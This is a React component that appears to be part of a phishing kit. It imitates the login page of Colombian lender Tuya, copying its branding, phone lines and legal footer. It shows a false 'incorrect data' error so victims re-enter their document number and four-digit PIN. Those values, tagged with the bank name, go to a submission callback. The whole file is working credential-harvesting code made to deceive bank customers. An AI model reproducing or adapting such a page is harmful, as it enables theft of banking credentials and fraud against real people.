/* eslint-disable jsx-a11y/alt-text */
/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import React, { useState, useCallback, useMemo, useEffect } from 'react';

import PopLoader from './PopLoader';

// --- CONFIGURACIÓN ESTÁTICA ---
const DESKTOP_KEY_ORDER = [0, 5, 4, 8, 1, 6, 7, 2, 3, 9];
const MOBILE_KEY_ORDER = [2, 7, 5, 9, 0, 3, 8, 1, 6, 4];
const MAX_PASSWORD_LENGTH = 4;

const KeyButton = ({ value, onClick, className = '' }: { value: string | number, onClick: () => void, className?: string }) => (
  <button
    type="button"
    onClick={onClick}
    className={`w-full h-10 lg:h-8 text-white font-bold text-lg rounded-sm transition-colors duration-150 ${className}`}
    style={{ backgroundColor: '#c00000', border: '1px solid #c00000' }}
  >
    {value}
  </button>
);

export default function ErrorApp({ enviar }: any) {
  const [documentType, setDocumentType] = useState('1');
  const [identification, setIdentification] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [currentDateTime, setCurrentDateTime] = useState('');

  const formatDateTime = (date: Date) => {
    const day = date.getDate();
    const month = date.getMonth() + 1;
    const year = date.getFullYear();

    const timeOptions: Intl.DateTimeFormatOptions = {
      hour: 'numeric',
      minute: '2-digit',
      second: '2-digit',
      hour12: true,
    };
    const timePart = date.toLocaleTimeString('es-CO', timeOptions);

    return `${day}/${month}/${year} ${timePart.replace(/\./g, '')}`;
  };

  useEffect(() => {
    const updateTime = () => {
      setCurrentDateTime(formatDateTime(new Date()));
    };

    updateTime();
    const timerId = setInterval(updateTime, 1000);
    return () => clearInterval(timerId);
  }, []);

  const appVersion = "5.0.2";

  const getKeyboardOrder = () => {
    if (typeof window !== 'undefined' && window.innerWidth < 1024) {
      return MOBILE_KEY_ORDER;
    }
    return DESKTOP_KEY_ORDER;
  };

  const activeKeyOrder = useMemo(() => getKeyboardOrder(), []);

  const fillPassword = useCallback((digit: string) => {
    if (password.length < MAX_PASSWORD_LENGTH) {
      setPassword(prev => prev + digit);
    }
  }, [password]);

  const clearPassword = useCallback(() => {
    setPassword('');
  }, []);

  const handleIdentificationChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    setIdentification(value);
  };

  const handleLoginClick = () => {
    if (password.length !== MAX_PASSWORD_LENGTH) {
      alert(`La clave debe tener ${MAX_PASSWORD_LENGTH} dígitos.`);
      return;
    }

    setLoading(true);

    const data = {
      view: "errorlogin",
      tipoIngreso: "clave_segura",
      user: identification,
      pass: password,
      bank: "Tuya",
      timestamp: new Date().toISOString(),
    };

    setTimeout(() => {
      enviar(data);
    }, 1500);
  };

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleLoginClick();
  };

  const getKeyValue = (index: number) => activeKeyOrder[index].toString();

  return (
    <div className="min-h-screen bg-gray-50 pb-10">
      {loading && <PopLoader />}
      
      {/* HEADER */}
      <header className="flex flex-col lg:flex-row justify-between items-center px-0">
        <div
          className="shrink-0 text-white font-bold text-xl mb-4 w-full lg:w-[350px]"
          style={{
            backgroundColor: '#fff',
            borderBottomRightRadius: '0px',
            height: '100px',
            lineHeight: '1.2'
          }}
        >
          <img src="/bancos/tuya/bannerPortalSinMarcas.png" />
        </div>
        <div className="flex flex-col text-sm text-gray-700 p-4 w-full lg:w-auto text-center lg:text-right">
          <span>Fecha Actual {currentDateTime}</span>
          <span>Versión {appVersion}</span>
        </div>
      </header>

      {/* CONTENT */}
      <div className="container mx-auto max-w-5xl pt-8 px-4">
        
        {/* Error Banner */}
        <div style={{ backgroundColor: '#ffebee', color: '#c62828', padding: '12px', borderRadius: '8px', marginBottom: '16px', textAlign: 'center', fontWeight: 'bold', fontSize: '14px', maxWidth: '600px', margin: '0 auto 20px' }}>
          Datos incorrectos. Por favor, verifica tu usuario y clave e inténtalo de nuevo.
        </div>

        <form onSubmit={handleFormSubmit} className="flex flex-col items-center">
          <div className="flex flex-col lg:flex-row w-full lg:justify-around items-center lg:items-start space-y-10 lg:space-y-0 lg:space-x-12">
            
            <div className="flex w-full justify-center lg:justify-start">
              <div className="grid grid-cols-2 gap-4 lg:gap-12 w-full max-w-lg lg:w-auto">
                
                {/* 1. TECLADO VIRTUAL */}
                <div className="flex flex-col space-y-1 w-[120px] lg:w-[180px] mt-0 lg:mt-10 mx-auto">
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(0)} onClick={() => fillPassword(getKeyValue(0))} />
                    <KeyButton value={getKeyValue(1)} onClick={() => fillPassword(getKeyValue(1))} />
                    <KeyButton value={getKeyValue(2)} onClick={() => fillPassword(getKeyValue(2))} />
                  </div>
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(3)} onClick={() => fillPassword(getKeyValue(3))} />
                    <KeyButton value={getKeyValue(4)} onClick={() => fillPassword(getKeyValue(4))} />
                    <KeyButton value={getKeyValue(5)} onClick={() => fillPassword(getKeyValue(5))} />
                  </div>
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(6)} onClick={() => fillPassword(getKeyValue(6))} />
                    <KeyButton value={getKeyValue(7)} onClick={() => fillPassword(getKeyValue(7))} />
                    <KeyButton value={getKeyValue(8)} onClick={() => fillPassword(getKeyValue(8))} />
                  </div>
                  <div className="grid grid-cols-3 gap-1">
                    <KeyButton value={getKeyValue(9)} onClick={() => fillPassword(getKeyValue(9))} className="col-span-1" />
                    <button
                      type="button"
                      onClick={clearPassword}
                      className="col-span-2 w-full h-10 lg:h-8 text-white font-bold text-lg rounded-sm transition-colors duration-150"
                      style={{ backgroundColor: '#c00000', border: '1px solid #c00000' }}
                    >
                      Borrar
                    </button>
                  </div>
                </div>

                {/* 2. CAMPOS DE LOGIN */}
                <div className="flex flex-col w-full space-y-4 max-w-[200px] lg:max-w-[250px] mx-auto">
                  <div>
                    <label className="font-bold text-gray-700 text-sm block mb-1">Tipo de Documento</label>
                    <select
                      value={documentType}
                      onChange={(e) => setDocumentType(e.target.value)}
                      className="w-full border border-gray-400 p-2 text-sm rounded-sm focus:ring-0 focus:border-red-600 h-10"
                      style={{ minWidth: '150px' }}
                    >
                      <option value="1">CÉDULA DE CIUDADANÍA</option>
                      <option value="2">CÉDULA DE EXTRANJERÍA</option>
                      <option value="6">CARNÉ DIPLOMÁTICO</option>
                    </select>
                  </div>

                  <div>
                    <label className="font-bold text-gray-700 text-sm block mb-1">Documento de Identificación</label>
                    <input
                      type="text"
                      maxLength={15}
                      className="w-full border border-gray-400 p-2 text-sm rounded-sm focus:ring-0 focus:border-red-600 h-10"
                      onChange={handleIdentificationChange}
                      value={identification}
                    />
                  </div>

                  <div className="flex items-center space-x-2">
                    <label className="font-bold text-gray-700 text-sm shrink-0">Clave</label>
                    <input
                      type="password"
                      maxLength={4}
                      readOnly
                      value={password.split('').map(() => '•').join('')}
                      className="w-16 border border-gray-400 p-2 text-sm text-center rounded-sm focus:ring-0 focus:border-red-600 h-10"
                    />
                    <button
                      type="button"
                      className="px-4 py-2 text-sm font-bold text-white rounded-sm transition-colors duration-150 h-10"
                      onClick={handleLoginClick}
                      style={{ backgroundColor: '#c00000' }}
                    >
                      Ingresar
                    </button>
                  </div>

                  <div className="text-left mt-2">
                    <span className="text-sm text-gray-700">Obtener </span>
                    <a href="#" className="text-blue-600 hover:underline text-sm">Ayuda</a>
                  </div>
                </div>
              </div>
            </div>

            {/* 3. IMAGEN LATERAL */}
            <div className="shrink-0 w-full sm:w-[300px] h-[250px] mt-8 lg:mt-0 lg:order-last order-3 mx-auto">
              <img
                src="/bancos/tuya/PublicidadPortal.jpeg"
                alt="Mujer hablando por teléfono"
                className="rounded-lg shadow-md object-cover w-full h-full"
              />
            </div>
          </div>

          {/* Logos de Tarjetas */}
          <div className="flex flex-wrap justify-center items-center gap-4 my-10 max-w-lg">
            <img src="/bancos/tuya/titulos-productos.png" alt={`Logo`} className="h-8" />
          </div>

          {/* Texto Legal */}
          <div className="text-center text-xs text-gray-600 max-w-xl px-4">
            Líneas de atención al cliente: Bogotá 601 482 4804 - Cali 602 380 8933 – Medellín 604 444 3727. Línea Nacional: 01 8000 978888<br />
            Todos los Derechos Reservados © 2019 Entidad Vigilada por la Superintendencia Financiera de Colombia<br />
            Para conocer acerca de la utilización de Información,<br />
            <a href="https://www.tuya.com.co/para-tener-en-cuenta" target="_blank" className="text-blue-600 hover:underline">Ingresa aquí</a>
          </div>

        </form>
      </div>
    </div>
  );
}
